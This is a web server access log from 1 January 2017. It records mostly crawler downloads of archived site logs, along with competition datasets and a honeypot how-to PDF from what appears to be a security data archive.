WSC,46.229.168.74,-,01/Jan/2017:11:19:04 -0800,GET /self.logs/error.log.2015-12-14.gz HTTP/1.1,200,643
WSC,46.229.168.68,-,01/Jan/2017:11:19:24 -0800,GET /self.logs/access.log.2016-06-02.gz HTTP/1.1,200,11263
WSC,46.229.168.74,-,01/Jan/2017:11:19:42 -0800,GET /self.logs/error.log.2016-05-12.gz HTTP/1.1,200,992
WSC,58.16.42.148,-,01/Jan/2017:11:19:50 -0800,HEAD /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,226
WSC,46.229.168.65,-,01/Jan/2017:11:20:02 -0800,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1,200,943
WSC,46.229.168.68,-,01/Jan/2017:11:20:25 -0800,GET /self.logs/error.log.2016-05-04.gz HTTP/1.1,200,744
WSC,46.229.168.70,-,01/Jan/2017:11:20:37 -0800,GET /self.logs/error.log.2015-01-23.gz HTTP/1.1,200,610
WSC,46.229.168.70,-,01/Jan/2017:11:21:04 -0800,GET /self.logs/error.log.2015-11-21.gz HTTP/1.1,200,1001
WSC,46.229.168.69,-,01/Jan/2017:11:21:12 -0800,GET /self.logs/error.log.2016-02-04.gz HTTP/1.1,200,871
WSC,46.229.168.73,-,01/Jan/2017:11:21:30 -0800,GET /self.logs/error.log.2015-10-22.gz HTTP/1.1,200,958
WSC,46.229.168.73,-,01/Jan/2017:11:21:49 -0800,GET /self.logs/error.log.2016-01-23.gz HTTP/1.1,200,847
WSC,46.229.168.72,-,01/Jan/2017:11:22:06 -0800,GET /maccdc2012/dns.log.gz HTTP/1.1,200,305376
WSC,46.229.168.67,-,01/Jan/2017:11:22:22 -0800,GET /self.logs/error.log.2015-07-04.gz HTTP/1.1,200,827
WSC,46.229.168.66,-,01/Jan/2017:11:22:43 -0800,GET /self.logs/error.log.2015-03-17.gz HTTP/1.1,200,794
WSC,46.229.168.68,-,01/Jan/2017:11:22:59 -0800,GET /self.logs/error.log.2015-08-26.gz HTTP/1.1,200,646
WSC,46.229.168.65,-,01/Jan/2017:11:23:20 -0800,GET /self.logs/error.log.2016-02-08.gz HTTP/1.1,200,676
WSC,46.229.168.71,-,01/Jan/2017:11:23:36 -0800,GET /self.logs/access.log.2016-04-16.gz HTTP/1.1,200,9797
WSC,46.229.168.72,-,01/Jan/2017:11:23:59 -0800,GET /self.logs/error.log.2015-07-19.gz HTTP/1.1,200,1059
WSC,46.229.168.67,-,01/Jan/2017:11:24:14 -0800,GET /self.logs/error.log.2015-10-15.gz HTTP/1.1,200,1075
WSC,46.229.168.67,-,01/Jan/2017:11:24:37 -0800,GET /self.logs/error.log.2015-10-28.gz HTTP/1.1,200,802
WSC,46.229.168.66,-,01/Jan/2017:11:24:50 -0800,GET /self.logs/access.log.2015-04-17.gz HTTP/1.1,200,6180
WSC,46.229.168.68,-,01/Jan/2017:11:25:08 -0800,GET /self.logs/error.log.2016-03-10.gz HTTP/1.1,200,823
WSC,46.229.168.66,-,01/Jan/2017:11:25:24 -0800,GET /self.logs/error.log.2015-03-27.gz HTTP/1.1,200,890
WSC,46.229.168.65,-,01/Jan/2017:11:25:41 -0800,GET /self.logs/error.log.2015-12-05.gz HTTP/1.1,200,757
WSC,46.229.168.71,-,01/Jan/2017:11:26:03 -0800,GET /self.logs/access.log.2015-05-17.gz HTTP/1.1,200,4073
WSC,46.229.168.73,-,01/Jan/2017:11:26:18 -0800,GET /self.logs/error.log.2015-08-11.gz HTTP/1.1,200,798
WSC,46.229.168.74,-,01/Jan/2017:11:26:37 -0800,GET /self.logs/access.log.2015-07-21.gz HTTP/1.1,200,5874
WSC,46.229.168.71,-,01/Jan/2017:11:26:56 -0800,GET /self.logs/error.log.2015-12-01.gz HTTP/1.1,200,728
WSC,46.229.168.74,-,01/Jan/2017:11:27:14 -0800,GET /self.logs/error.log.2015-11-30.gz HTTP/1.1,200,853
WSC,46.229.168.71,-,01/Jan/2017:11:27:32 -0800,GET /self.logs/error.log.2015-01-29.gz HTTP/1.1,200,1460
WSC,46.229.168.67,-,01/Jan/2017:11:27:50 -0800,GET /self.logs/error.log.2016-04-24.gz HTTP/1.1,200,616
WSC,46.229.168.67,-,01/Jan/2017:11:28:09 -0800,GET /self.logs/access.log.2015-08-06.gz HTTP/1.1,200,6129
WSC,66.249.93.64,-,01/Jan/2017:11:28:23 -0800,GET / HTTP/1.1,200,10267
WSC,66.249.93.95,-,01/Jan/2017:11:28:23 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,46.229.168.69,-,01/Jan/2017:11:28:35 -0800,GET /self.logs/error.log.2015-09-24.gz HTTP/1.1,200,696
WSC,46.229.168.73,-,01/Jan/2017:11:28:45 -0800,GET /self.logs/access.log.2015-03-11.gz HTTP/1.1,200,2423
WSC,46.229.168.68,-,01/Jan/2017:11:29:00 -0800,GET /self.logs/error.log.2016-01-17.gz HTTP/1.1,200,693
WSC,46.229.168.72,-,01/Jan/2017:11:29:18 -0800,GET /self.logs/access.log.2015-12-19.gz HTTP/1.1,200,6389
WSC,46.229.168.68,-,01/Jan/2017:11:29:35 -0800,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1,200,1220
WSC,46.229.168.69,-,01/Jan/2017:11:29:55 -0800,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1,200,11253
WSC,46.229.168.65,-,01/Jan/2017:11:30:13 -0800,GET /self.logs/access.log.2015-10-08.gz HTTP/1.1,200,3870
WSC,46.229.168.72,-,01/Jan/2017:11:30:30 -0800,GET /self.logs/error.log.2015-08-07.gz HTTP/1.1,200,1058
WSC,46.229.168.65,-,01/Jan/2017:11:30:54 -0800,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1,200,2166
WSC,46.229.168.71,-,01/Jan/2017:11:31:08 -0800,GET /self.logs/access.log.2015-07-17.gz HTTP/1.1,200,4609
WSC,46.229.168.67,-,01/Jan/2017:11:31:28 -0800,GET /self.logs/access.log.2015-12-09.gz HTTP/1.1,200,7689
WSC,46.229.168.73,-,01/Jan/2017:11:31:43 -0800,GET /squid/access.log.gz HTTP/1.1,200,295241
WSC,46.229.168.73,-,01/Jan/2017:11:32:05 -0800,GET /self.logs/access.log.2015-10-18.gz HTTP/1.1,200,4376
WSC,46.229.168.70,-,01/Jan/2017:11:32:23 -0800,GET /self.logs/error.log.2015-11-13.gz HTTP/1.1,200,567
WSC,46.229.168.73,-,01/Jan/2017:11:32:42 -0800,GET /self.logs/error.log.2015-05-09.gz HTTP/1.1,200,741
WSC,46.229.168.69,-,01/Jan/2017:11:32:59 -0800,GET /self.logs/error.log.2016-05-05.gz HTTP/1.1,200,690
WSC,46.229.168.69,-,01/Jan/2017:11:33:14 -0800,GET /self.logs/access.log.2015-02-13.gz HTTP/1.1,200,15573
WSC,46.229.168.71,-,01/Jan/2017:11:33:36 -0800,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1,200,607
WSC,46.229.168.65,-,01/Jan/2017:11:33:53 -0800,GET /self.logs/access.log.2015-12-03.gz HTTP/1.1,200,5151
WSC,46.229.168.70,-,01/Jan/2017:11:34:13 -0800,GET /self.logs/error.log.2015-06-04.gz HTTP/1.1,200,931
WSC,46.229.168.69,-,01/Jan/2017:11:34:30 -0800,GET /self.logs/access.log.2015-04-21.gz HTTP/1.1,200,6686
WSC,46.229.168.73,-,01/Jan/2017:11:34:45 -0800,GET /self.logs/access.log.2016-01-25.gz HTTP/1.1,200,6640
WSC,46.229.168.65,-,01/Jan/2017:11:35:03 -0800,GET /self.logs/error.log.2015-01-27.gz HTTP/1.1,200,635
WSC,46.229.168.71,-,01/Jan/2017:11:35:20 -0800,GET /self.logs/access.log.2016-04-17.gz HTTP/1.1,200,8951
WSC,46.229.168.74,-,01/Jan/2017:11:35:37 -0800,GET /self.logs/error.log.2015-11-17.gz HTTP/1.1,200,565
WSC,46.229.168.66,-,01/Jan/2017:11:35:55 -0800,GET /self.logs/access.log.2016-02-09.gz HTTP/1.1,200,9365
WSC,46.229.168.68,-,01/Jan/2017:11:36:17 -0800,GET /self.logs/error.log.2016-01-06.gz HTTP/1.1,200,689
WSC,46.229.168.69,-,01/Jan/2017:11:36:37 -0800,GET /self.logs/access.log.2016-02-20.gz HTTP/1.1,200,10101
WSC,46.229.168.70,-,01/Jan/2017:11:36:52 -0800,GET /self.logs/error.log.2015-12-02.gz HTTP/1.1,200,621
WSC,46.229.168.71,-,01/Jan/2017:11:37:10 -0800,GET /self.logs/access.log.2015-01-26.gz HTTP/1.1,200,3220
WSC,46.229.168.66,-,01/Jan/2017:11:37:26 -0800,GET /self.logs/access.log.2015-09-02.gz HTTP/1.1,200,3890
WSC,46.229.168.74,-,01/Jan/2017:11:37:49 -0800,GET /self.logs/access.log.2015-08-07.gz HTTP/1.1,200,4598
WSC,46.229.168.72,-,01/Jan/2017:11:38:02 -0800,GET /self.logs/access.log.2015-02-07.gz HTTP/1.1,200,2783
WSC,46.229.168.70,-,01/Jan/2017:11:38:25 -0800,GET /self.logs/error.log.2015-08-19.gz HTTP/1.1,200,766
WSC,46.229.168.74,-,01/Jan/2017:11:38:43 -0800,GET /self.logs/access.log.2015-08-08.gz HTTP/1.1,200,2816
WSC,46.229.168.66,-,01/Jan/2017:11:39:03 -0800,GET /self.logs/access.log.2015-04-26.gz HTTP/1.1,200,3853
WSC,46.229.168.70,-,01/Jan/2017:11:39:30 -0800,GET /self.logs/error.log.2016-03-14.gz HTTP/1.1,200,902
WSC,46.229.168.72,-,01/Jan/2017:11:39:39 -0800,GET /self.logs/access.log.2015-02-05.gz HTTP/1.1,200,3517
WSC,46.229.168.67,-,01/Jan/2017:11:40:00 -0800,GET /self.logs/error.log.2015-11-19.gz HTTP/1.1,200,1657
WSC,46.229.168.65,-,01/Jan/2017:11:40:27 -0800,GET /self.logs/error.log.2015-01-19.gz HTTP/1.1,200,1139
WSC,46.229.168.67,-,01/Jan/2017:11:40:40 -0800,GET /self.logs/access.log.2015-04-14.gz HTTP/1.1,200,5028
WSC,46.229.168.74,-,01/Jan/2017:11:41:12 -0800,GET /self.logs/error.log.2016-05-18.gz HTTP/1.1,200,664
WSC,46.229.168.69,-,01/Jan/2017:11:41:18 -0800,GET /self.logs/access.log.2015-09-24.gz HTTP/1.1,200,4767
WSC,46.229.168.74,-,01/Jan/2017:11:41:39 -0800,GET /self.logs/access.log.2016-05-23.gz HTTP/1.1,200,15193
WSC,46.229.168.71,-,01/Jan/2017:11:42:03 -0800,GET /self.logs/access.log.2015-12-26.gz HTTP/1.1,200,3786
WSC,46.229.168.67,-,01/Jan/2017:11:42:14 -0800,GET /self.logs/error.log.2016-04-17.gz HTTP/1.1,200,825
WSC,46.229.168.68,-,01/Jan/2017:11:42:36 -0800,GET /self.logs/error.log.2015-08-16.gz HTTP/1.1,200,2656
WSC,46.229.168.71,-,01/Jan/2017:11:43:06 -0800,GET /self.logs/access.log.2016-06-11.gz HTTP/1.1,200,7697
WSC,46.229.168.65,-,01/Jan/2017:11:43:25 -0800,GET /self.logs/error.log.2016-06-11.gz HTTP/1.1,200,816
WSC,46.229.168.73,-,01/Jan/2017:11:43:34 -0800,GET /self.logs/access.log.2015-08-27.gz HTTP/1.1,200,6066
WSC,65.55.210.255,-,01/Jan/2017:11:43:06 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,16758642
WSC,46.229.168.70,-,01/Jan/2017:11:44:10 -0800,GET /self.logs/access.log.2015-05-29.gz HTTP/1.1,200,3713
WSC,46.229.168.65,-,01/Jan/2017:11:44:11 -0800,GET /self.logs/error.log.2015-04-04.gz HTTP/1.1,200,2224
WSC,46.229.168.65,-,01/Jan/2017:11:44:11 -0800,GET /self.logs/error.log.2015-04-04.gz HTTP/1.1,200,2224
WSC,46.229.168.73,-,01/Jan/2017:11:44:30 -0800,GET /self.logs/access.log.2016-01-01.gz HTTP/1.1,200,5468
WSC,46.229.168.68,-,01/Jan/2017:11:44:57 -0800,GET /self.logs/access.log.2015-03-20.gz HTTP/1.1,200,4178
WSC,46.229.168.73,-,01/Jan/2017:11:45:06 -0800,GET /self.logs/error.log.2015-02-27.gz HTTP/1.1,200,825
WSC,46.229.168.68,-,01/Jan/2017:11:45:28 -0800,GET /self.logs/?C=S%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.68,-,01/Jan/2017:11:45:54 -0800,GET /self.logs/?C=S%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.71,-,01/Jan/2017:11:46:02 -0800,GET /self.logs/error.log.2015-07-23.gz HTTP/1.1,200,1053
WSC,46.229.168.73,-,01/Jan/2017:11:46:07 -0800,GET /self.logs/error.log.2015-07-13.gz HTTP/1.1,200,802
WSC,46.229.168.69,-,01/Jan/2017:11:46:31 -0800,GET /self.logs/error.log.2016-03-29.gz HTTP/1.1,200,705
WSC,46.229.168.69,-,01/Jan/2017:11:46:46 -0800,GET /self.logs/access.log.2015-12-02.gz HTTP/1.1,200,5957
WSC,46.229.168.68,-,01/Jan/2017:11:47:06 -0800,GET /self.logs/access.log.2016-04-09.gz HTTP/1.1,200,11424
WSC,46.229.168.74,-,01/Jan/2017:11:47:20 -0800,GET /self.logs/error.log.2016-06-01.gz HTTP/1.1,200,1622
WSC,46.229.168.71,-,01/Jan/2017:11:47:56 -0800,GET /self.logs/access.log.2015-08-22.gz HTTP/1.1,200,4457
WSC,46.229.168.65,-,01/Jan/2017:11:48:04 -0800,GET /self.logs/access.log.2015-05-01.gz HTTP/1.1,200,4450
WSC,69.30.210.242,-,01/Jan/2017:11:48:04 -0800,GET /robots.txt HTTP/1.1,200,289
WSC,69.30.210.242,-,01/Jan/2017:11:48:09 -0800,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1,404,239
WSC,46.229.168.73,-,01/Jan/2017:11:48:18 -0800,GET /self.logs/access.log.2015-02-27.gz HTTP/1.1,200,3186
WSC,46.229.168.71,-,01/Jan/2017:11:48:45 -0800,GET /self.logs/error.log.2015-06-15.gz HTTP/1.1,200,1292
WSC,46.229.168.71,-,01/Jan/2017:11:48:53 -0800,GET /self.logs/access.log.2015-06-13.gz HTTP/1.1,200,3578
WSC,46.229.168.72,-,01/Jan/2017:11:49:11 -0800,GET /self.logs/error.log.2016-02-09.gz HTTP/1.1,200,640
WSC,46.229.168.74,-,01/Jan/2017:11:49:36 -0800,GET /self.logs/error.log.2015-08-15.gz HTTP/1.1,200,650
WSC,46.229.168.74,-,01/Jan/2017:11:49:50 -0800,GET /self.logs/access.log.2015-05-09.gz HTTP/1.1,200,2819
WSC,46.229.168.68,-,01/Jan/2017:11:50:11 -0800,GET /self.logs/access.log.2016-03-28.gz HTTP/1.1,200,12351
WSC,46.229.168.74,-,01/Jan/2017:11:50:24 -0800,GET /self.logs/access.log.2015-06-03.gz HTTP/1.1,200,3363
WSC,46.229.168.69,-,01/Jan/2017:11:50:51 -0800,GET /self.logs/access.log.2016-03-22.gz HTTP/1.1,200,8257
WSC,46.229.168.70,-,01/Jan/2017:11:51:05 -0800,GET /self.logs/access.log.2015-03-22.gz HTTP/1.1,200,3642
WSC,46.229.168.71,-,01/Jan/2017:11:51:17 -0800,GET /self.logs/error.log.2015-02-28.gz HTTP/1.1,200,939
WSC,46.229.168.74,-,01/Jan/2017:11:51:41 -0800,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1,200,671
WSC,46.229.168.69,-,01/Jan/2017:11:51:59 -0800,GET /self.logs/access.log.2016-04-03.gz HTTP/1.1,200,14138
WSC,46.229.168.72,-,01/Jan/2017:11:52:14 -0800,GET /self.logs/error.log.2016-02-13.gz HTTP/1.1,200,812
WSC,46.229.168.72,-,01/Jan/2017:11:52:35 -0800,GET /self.logs/access.log.2015-10-02.gz HTTP/1.1,200,3773
WSC,46.229.168.72,-,01/Jan/2017:11:53:01 -0800,GET /self.logs/error.log.2016-04-04.gz HTTP/1.1,200,617
WSC,46.229.168.67,-,01/Jan/2017:11:53:09 -0800,GET /self.logs/error.log.2015-10-24.gz HTTP/1.1,200,830
WSC,46.229.168.70,-,01/Jan/2017:11:53:26 -0800,GET /self.logs/access.log.2015-08-09.gz HTTP/1.1,200,4540
WSC,46.229.168.72,-,01/Jan/2017:11:53:46 -0800,GET /self.logs/error.log.2016-02-07.gz HTTP/1.1,200,695
WSC,46.229.168.66,-,01/Jan/2017:11:54:06 -0800,GET /self.logs/error.log.2015-09-25.gz HTTP/1.1,200,761
WSC,46.229.168.72,-,01/Jan/2017:11:54:23 -0800,GET /self.logs/error.log.2015-07-02.gz HTTP/1.1,200,803
WSC,46.229.168.67,-,01/Jan/2017:11:54:40 -0800,GET /self.logs/error.log.2015-03-25.gz HTTP/1.1,200,928
WSC,46.229.168.72,-,01/Jan/2017:11:55:00 -0800,GET /self.logs/access.log.2015-05-13.gz HTTP/1.1,200,7807
WSC,46.229.168.70,-,01/Jan/2017:11:55:16 -0800,GET /self.logs/access.log.2016-01-30.gz HTTP/1.1,200,34273
WSC,46.229.168.65,-,01/Jan/2017:11:55:44 -0800,GET /self.logs/access.log.2015-06-24.gz HTTP/1.1,200,4057
WSC,46.229.168.66,-,01/Jan/2017:11:55:57 -0800,GET /self.logs/access.log.2016-03-29.gz HTTP/1.1,200,8883
WSC,46.229.168.73,-,01/Jan/2017:11:56:09 -0800,GET /self.logs/error.log.2016-01-26.gz HTTP/1.1,200,714
WSC,46.229.168.66,-,01/Jan/2017:11:56:39 -0800,GET /self.logs/access.log.2016-01-15.gz HTTP/1.1,200,7490
WSC,46.229.168.69,-,01/Jan/2017:11:56:50 -0800,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1,200,10578
WSC,46.229.168.69,-,01/Jan/2017:11:57:12 -0800,GET /self.logs/error.log.2015-06-05.gz HTTP/1.1,200,637
WSC,46.229.168.72,-,01/Jan/2017:11:57:29 -0800,GET /self.logs/error.log.2016-02-20.gz HTTP/1.1,200,528
WSC,46.229.168.65,-,01/Jan/2017:11:57:53 -0800,GET /self.logs/error.log.2015-06-14.gz HTTP/1.1,200,886
WSC,46.229.168.74,-,01/Jan/2017:11:58:04 -0800,GET /self.logs/access.log.2015-01-30.gz HTTP/1.1,200,6235
WSC,46.229.168.68,-,01/Jan/2017:11:58:25 -0800,GET /self.logs/access.log.2015-01-19.gz HTTP/1.1,200,2799
WSC,46.229.168.73,-,01/Jan/2017:11:58:41 -0800,GET /self.logs/access.log.2015-03-23.gz HTTP/1.1,200,4096
WSC,46.229.168.67,-,01/Jan/2017:11:58:57 -0800,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1,200,3792
WSC,46.229.168.71,-,01/Jan/2017:11:59:18 -0800,GET /self.logs/error.log.2015-08-22.gz HTTP/1.1,200,664
WSC,46.229.168.69,-,01/Jan/2017:11:59:34 -0800,GET /self.logs/error.log.2015-11-04.gz HTTP/1.1,200,1046
WSC,46.229.168.65,-,01/Jan/2017:11:59:51 -0800,GET /self.logs/error.log.2015-05-14.gz HTTP/1.1,200,1026
WSC,46.229.168.68,-,01/Jan/2017:12:00:07 -0800,GET /self.logs/access.log.2016-06-13.gz HTTP/1.1,200,20921
WSC,46.229.168.69,-,01/Jan/2017:12:00:28 -0800,GET /self.logs/error.log.2015-03-29.gz HTTP/1.1,200,801
WSC,46.229.168.73,-,01/Jan/2017:12:00:49 -0800,GET /self.logs/access.log.2016-03-07.gz HTTP/1.1,200,9442
WSC,46.229.168.65,-,01/Jan/2017:12:01:03 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,296701
WSC,46.229.168.65,-,01/Jan/2017:12:01:22 -0800,GET /self.logs/error.log.2015-07-14.gz HTTP/1.1,200,615
WSC,46.229.168.70,-,01/Jan/2017:12:01:44 -0800,GET /self.logs/access.log.2015-08-04.gz HTTP/1.1,200,5744
WSC,46.229.168.72,-,01/Jan/2017:12:02:03 -0800,GET /self.logs/error.log.2015-06-16.gz HTTP/1.1,200,710
WSC,46.229.168.69,-,01/Jan/2017:12:02:20 -0800,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1,200,732
WSC,46.229.168.68,-,01/Jan/2017:12:02:38 -0800,GET /self.logs/access.log.2016-04-14.gz HTTP/1.1,200,9233
WSC,46.229.168.69,-,01/Jan/2017:12:03:01 -0800,GET /self.logs/error.log.2015-05-17.gz HTTP/1.1,200,749
WSC,46.229.168.65,-,01/Jan/2017:12:03:19 -0800,GET /self.logs/access.log.2015-05-19.gz HTTP/1.1,200,4744
WSC,46.229.168.65,-,01/Jan/2017:12:03:35 -0800,GET /self.logs/error.log.2016-06-14.gz HTTP/1.1,200,1198
WSC,46.229.168.65,-,01/Jan/2017:12:03:52 -0800,GET /self.logs/access.log.2015-01-18.gz HTTP/1.1,200,3435
WSC,46.229.168.74,-,01/Jan/2017:12:04:13 -0800,GET /self.logs/error.log.2015-02-10.gz HTTP/1.1,200,4865
WSC,46.229.168.67,-,01/Jan/2017:12:04:31 -0800,GET /self.logs/access.log.2016-01-13.gz HTTP/1.1,200,6515
WSC,46.229.168.73,-,01/Jan/2017:12:04:48 -0800,GET /self.logs/access.log.2015-07-18.gz HTTP/1.1,200,5186
WSC,46.229.168.68,-,01/Jan/2017:12:05:08 -0800,GET /self.logs/error.log.2015-12-03.gz HTTP/1.1,200,682
WSC,46.229.168.65,-,01/Jan/2017:12:05:25 -0800,GET /self.logs/error.log.2015-02-19.gz HTTP/1.1,200,5365
WSC,54.172.242.152,-,01/Jan/2017:12:05:28 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25834
WSC,46.229.168.66,-,01/Jan/2017:12:05:41 -0800,GET /self.logs/access.log.2015-08-25.gz HTTP/1.1,200,6475
WSC,46.229.168.67,-,01/Jan/2017:12:06:03 -0800,GET /self.logs/error.log.2015-04-08.gz HTTP/1.1,200,557
WSC,46.229.168.69,-,01/Jan/2017:12:06:19 -0800,GET /self.logs/error.log.2015-05-23.gz HTTP/1.1,200,747
WSC,46.229.168.72,-,01/Jan/2017:12:06:43 -0800,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1,200,3487
WSC,46.229.168.72,-,01/Jan/2017:12:07:01 -0800,GET /self.logs/error.log.2015-05-05.gz HTTP/1.1,200,649
WSC,46.229.168.66,-,01/Jan/2017:12:07:16 -0800,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1,200,7295
WSC,46.229.168.67,-,01/Jan/2017:12:07:32 -0800,GET /self.logs/error.log.2016-03-18.gz HTTP/1.1,200,654
WSC,46.229.168.72,-,01/Jan/2017:12:07:58 -0800,GET /self.logs/error.log.2015-09-14.gz HTTP/1.1,200,1004
WSC,46.229.168.65,-,01/Jan/2017:12:08:12 -0800,GET /self.logs/access.log.2015-04-16.gz HTTP/1.1,200,11899
WSC,46.229.168.67,-,01/Jan/2017:12:08:34 -0800,GET /self.logs/access.log.2016-02-04.gz HTTP/1.1,200,7223
WSC,46.229.168.69,-,01/Jan/2017:12:09:00 -0800,GET /self.logs/access.log.2015-12-08.gz HTTP/1.1,200,9224
WSC,46.229.168.66,-,01/Jan/2017:12:09:14 -0800,GET /self.logs/access.log.2015-12-24.gz HTTP/1.1,200,5373
WSC,46.229.168.71,-,01/Jan/2017:12:09:33 -0800,GET /self.logs/error.log.2016-01-18.gz HTTP/1.1,200,1106
WSC,46.229.168.70,-,01/Jan/2017:12:09:58 -0800,GET /self.logs/error.log.2015-08-12.gz HTTP/1.1,200,957
WSC,46.229.168.71,-,01/Jan/2017:12:10:17 -0800,GET /self.logs/error.log.2015-11-18.gz HTTP/1.1,200,967
WSC,46.229.168.71,-,01/Jan/2017:12:10:36 -0800,GET /self.logs/access.log.2016-03-15.gz HTTP/1.1,200,7114
WSC,46.229.168.65,-,01/Jan/2017:12:10:57 -0800,GET /self.logs/access.log.2015-08-20.gz HTTP/1.1,200,5268
WSC,46.229.168.67,-,01/Jan/2017:12:11:15 -0800,GET /self.logs/access.log.2015-08-30.gz HTTP/1.1,200,4415
WSC,46.229.168.71,-,01/Jan/2017:12:11:35 -0800,GET /self.logs/access.log.2015-02-19.gz HTTP/1.1,200,12911
WSC,46.229.168.73,-,01/Jan/2017:12:12:03 -0800,GET /self.logs/access.log.2016-06-06.gz HTTP/1.1,200,8410
WSC,46.229.168.71,-,01/Jan/2017:12:12:12 -0800,GET /self.logs/error.log.2015-06-12.gz HTTP/1.1,200,1004
WSC,46.229.168.67,-,01/Jan/2017:12:12:26 -0800,GET /self.logs/error.log.2015-02-04.gz HTTP/1.1,200,501
WSC,46.229.168.74,-,01/Jan/2017:12:12:58 -0800,GET /self.logs/access.log.2015-01-25.gz HTTP/1.1,200,3024
WSC,46.229.168.74,-,01/Jan/2017:12:13:14 -0800,GET /self.logs/access.log.2016-05-19.gz HTTP/1.1,200,10166
WSC,46.229.168.73,-,01/Jan/2017:12:13:44 -0800,GET /self.logs/access.log.2015-06-16.gz HTTP/1.1,200,9097
WSC,46.229.168.69,-,01/Jan/2017:12:14:06 -0800,GET /self.logs/error.log.2015-08-31.gz HTTP/1.1,200,767
WSC,46.229.168.71,-,01/Jan/2017:12:14:12 -0800,GET /self.logs/access.log.2015-12-31.gz HTTP/1.1,200,6757
WSC,46.229.168.70,-,01/Jan/2017:12:14:51 -0800,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1,200,5129
WSC,46.229.168.69,-,01/Jan/2017:12:14:56 -0800,GET /self.logs/access.log.2015-03-29.gz HTTP/1.1,200,3467
WSC,46.229.168.69,-,01/Jan/2017:12:15:29 -0800,GET /self.logs/access.log.2016-04-23.gz HTTP/1.1,200,6397
WSC,46.229.168.72,-,01/Jan/2017:12:15:20 -0800,GET /maccdc2012/weird.log.gz HTTP/1.1,200,305376
WSC,46.229.168.69,-,01/Jan/2017:12:15:45 -0800,GET /self.logs/access.log.2015-09-21.gz HTTP/1.1,200,5487
WSC,46.229.168.68,-,01/Jan/2017:12:16:06 -0800,GET /self.logs/error.log.2016-02-11.gz HTTP/1.1,200,830
WSC,46.229.168.67,-,01/Jan/2017:12:16:27 -0800,GET /self.logs/error.log.2015-11-24.gz HTTP/1.1,200,1024
WSC,46.229.168.74,-,01/Jan/2017:12:16:50 -0800,GET /self.logs/error.log.2015-07-31.gz HTTP/1.1,200,825
WSC,46.229.168.67,-,01/Jan/2017:12:17:04 -0800,GET /self.logs/error.log.2015-08-08.gz HTTP/1.1,200,742
WSC,46.229.168.66,-,01/Jan/2017:12:17:24 -0800,GET /self.logs/access.log.2015-03-10.gz HTTP/1.1,200,13373
WSC,46.229.168.65,-,01/Jan/2017:12:17:39 -0800,GET /self.logs/error.log.2015-10-19.gz HTTP/1.1,200,692
WSC,46.229.168.69,-,01/Jan/2017:12:18:16 -0800,GET /self.logs/access.log.2015-09-03.gz HTTP/1.1,200,4912
WSC,46.229.168.65,-,01/Jan/2017:12:18:23 -0800,GET /self.logs/access.log.2015-06-07.gz HTTP/1.1,200,3415
WSC,46.229.168.74,-,01/Jan/2017:12:18:50 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25915
WSC,46.229.168.72,-,01/Jan/2017:12:19:06 -0800,GET /self.logs/error.log.2015-04-09.gz HTTP/1.1,200,581
WSC,46.229.168.68,-,01/Jan/2017:12:19:13 -0800,GET /self.logs/error.log.2015-06-21.gz HTTP/1.1,200,2241
WSC,46.229.168.70,-,01/Jan/2017:12:19:55 -0800,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1,200,873
WSC,46.229.168.70,-,01/Jan/2017:12:19:55 -0800,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1,200,873
WSC,46.229.168.73,-,01/Jan/2017:12:20:00 -0800,GET /self.logs/access.log.2015-07-26.gz HTTP/1.1,200,3464
WSC,46.229.168.65,-,01/Jan/2017:12:20:23 -0800,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1,200,2949
WSC,46.229.168.65,-,01/Jan/2017:12:20:52 -0800,GET /self.logs/access.log.2016-03-24.gz HTTP/1.1,200,11197
WSC,46.229.168.73,-,01/Jan/2017:12:21:18 -0800,GET /self.logs/error.log.2016-05-27.gz HTTP/1.1,200,908
WSC,46.229.168.72,-,01/Jan/2017:12:21:31 -0800,GET /self.logs/access.log.2016-01-17.gz HTTP/1.1,200,4357
WSC,46.229.168.65,-,01/Jan/2017:12:21:53 -0800,GET /self.logs/error.log.2015-05-02.gz HTTP/1.1,200,834
WSC,46.229.168.65,-,01/Jan/2017:12:22:08 -0800,GET /self.logs/error.log.2015-01-20.gz HTTP/1.1,200,961
WSC,46.229.168.66,-,01/Jan/2017:12:22:29 -0800,GET /self.logs/error.log.2015-08-17.gz HTTP/1.1,200,1918
WSC,46.229.168.71,-,01/Jan/2017:12:22:45 -0800,GET /self.logs/access.log.2016-04-11.gz HTTP/1.1,200,8778
WSC,46.229.168.69,-,01/Jan/2017:12:23:13 -0800,GET /self.logs/access.log.2015-09-06.gz HTTP/1.1,200,4835
WSC,46.229.168.74,-,01/Jan/2017:12:23:26 -0800,GET /self.logs/error.log.2015-01-22.gz HTTP/1.1,200,651
WSC,46.229.168.67,-,01/Jan/2017:12:23:57 -0800,GET /self.logs/error.log.2015-02-14.gz HTTP/1.1,200,9852
WSC,46.229.168.74,-,01/Jan/2017:12:23:58 -0800,GET /self.logs/access.log.2015-12-21.gz HTTP/1.1,200,10544
WSC,46.229.168.70,-,01/Jan/2017:12:24:31 -0800,GET /self.logs/error.log.2016-04-16.gz HTTP/1.1,200,924
WSC,46.229.168.74,-,01/Jan/2017:12:24:38 -0800,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1,200,7253
WSC,46.229.168.66,-,01/Jan/2017:12:24:55 -0800,GET /self.logs/error.log.2015-05-11.gz HTTP/1.1,200,1103
